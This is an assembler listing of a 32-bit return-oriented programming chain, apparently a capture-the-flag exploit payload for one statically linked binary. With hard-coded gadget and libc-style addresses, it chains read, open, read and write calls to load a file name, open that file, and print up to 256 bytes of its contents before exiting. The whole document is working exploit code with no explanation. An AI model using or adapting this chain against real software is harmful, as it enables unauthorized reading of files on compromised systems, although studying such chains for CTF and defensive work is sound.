     1                                  bits 32
     2                                  
     3                                  read equ	0x0806CD80
     4                                  write equ	0x0806CE50
     5                                  open equ	0x0806CC60
     6                                  exit equ	0x0804EEC0
     7                                  
     8                                  ppr equ		0x0806CE81
     9                                  pppr equ	0x0806CD02
    10                                  buffer equ	0x080DA060
    11                                  
    12                                  rop:
    13 00000000 80CD0608                	dd read
    14 00000004 02CD0608                	dd pppr
    15 00000008 00000000                	dd 0
    16 0000000C 60A00D08                	dd buffer
    17 00000010 09000000                	dd 9
    18                                  
    19 00000014 60CC0608                	dd open
    20 00000018 81CE0608                	dd ppr
    21 0000001C 60A00D08                	dd buffer
    22 00000020 00000000                	dd 0
    23                                  
    24 00000024 80CD0608                	dd read
    25 00000028 02CD0608                	dd pppr
    26 0000002C 05000000                	dd 5
    27 00000030 60A00D08                	dd buffer
    28 00000034 00010000                	dd 256
    29                                  
    30 00000038 50CE0608                	dd write
    31 0000003C C0EE0408                	dd exit
    32 00000040 01000000                	dd 1
    33 00000044 60A00D08                	dd buffer
    34 00000048 00010000                	dd 256
